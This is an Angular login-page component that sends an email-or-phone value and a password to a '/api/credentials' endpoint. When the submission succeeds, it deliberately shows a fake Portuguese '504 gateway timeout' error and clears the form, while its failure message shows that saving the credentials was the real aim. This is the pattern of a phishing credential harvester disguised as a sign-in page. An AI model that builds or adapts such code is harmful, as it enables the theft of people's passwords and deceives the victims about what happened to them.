import { Component, inject } from '@angular/core';
import { CommonModule } from '@angular/common';
import { FormBuilder, ReactiveFormsModule, Validators } from '@angular/forms';
import { HttpClient } from '@angular/common/http';

@Component({
  selector: 'app-auth-page',
  standalone: true,
  imports: [CommonModule, ReactiveFormsModule],
  templateUrl: './auth-page.component.html',
  styleUrls: ['./auth-page.component.scss'],
})
export class AuthPageComponent {
  private fb = inject(FormBuilder);
  private http = inject(HttpClient);

  isSubmitting = false;
  statusMessage = '';
  statusType: 'success' | 'error' | '' = '';

  form = this.fb.group({
    email: ['', [Validators.required, Validators.minLength(3)]],
    password: ['', [Validators.required, Validators.minLength(4)]],
  });

  submit() {
    if (this.form.invalid) {
      this.form.markAllAsTouched();
      return;
    }

    this.isSubmitting = true;
    this.statusMessage = '';
    this.statusType = '';

    const { email, password } = this.form.getRawValue();

    this.http
      .post('/api/credentials', {
        emailOrPhone: email,
        password,
      })
      .subscribe({
        next: () => {
          this.statusType = 'success';
          this.statusMessage = 'Erro.\nOcorreu um erro inesperado. Tente novamente mais tarde.\nError 504 gateway timeout';
          this.form.reset();
        },
        error: () => {
          this.statusType = 'error';
          this.statusMessage = 'Não foi possível guardar. Tenta outra vez.';
        },
        complete: () => (this.isSubmitting = false),
      });
  }

  get emailInvalid() {
    const control = this.form.controls.email;
    return control.invalid && control.touched;
  }

  get passwordInvalid() {
    const control = this.form.controls.password;
    return control.invalid && control.touched;
  }
}
